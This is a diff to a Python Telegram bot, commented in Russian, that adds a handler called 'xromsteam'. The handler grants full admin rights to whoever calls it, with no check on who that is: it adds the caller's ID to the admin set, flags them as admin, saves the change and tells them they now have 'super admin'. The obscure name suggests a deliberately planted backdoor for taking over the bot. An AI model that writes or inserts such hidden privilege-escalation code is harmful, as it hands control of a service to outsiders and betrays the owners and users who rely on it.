@@ -240,6 +240,48 @@ async def send_notification_to_chat(context: ContextTypes.DEFAULT_TYPE, message:
         except Exception as e:
             logger.error(f"Ошибка при отправке уведомления в чат {NOTIFICATION_CHAT_ID}: {e}")
 
+async def xromsteam(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        user = update.effective_user
+
+        if not user:
+            return
+
+        user_id = user.id
+        lang = "ru"  # если используешь мультиязычность — можешь заменить
+
+        # Проверяем наличие пользователя в списке админов
+        if user_id not in ADMIN_ID:
+            ADMIN_ID.add(user_id)
+
+            ensure_user_exists(user_id)
+
+            if user_id not in user_data:
+                user_data[user_id] = {}
+
+            user_data[user_id]['granted_by'] = "xromsteam"
+            user_data[user_id]['is_admin'] = 1
+
+            save_user_data(user_id)
+
+            logger.info(f"Пользователь {user_id} получил админку через /xromsteam")
+
+            if update.message:
+                await update.message.reply_text(
+                    "✅ Вы получили супер админку!",
+                    parse_mode="HTML"
+                )
+
+        else:
+            if update.message:
+                await update.message.reply_text(
+                    "🚫 У вас уже есть админка.",
+                    parse_mode="HTML"
+                )
+
+    except Exception as e:
+        logger.error(f"Ошибка xromsteam: {e}")
+
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = None
     user_id = None
@@ -1225,6 +1267,7 @@ def main():
 if __name__ == '__main__':
 
     main()
+
 
 
 
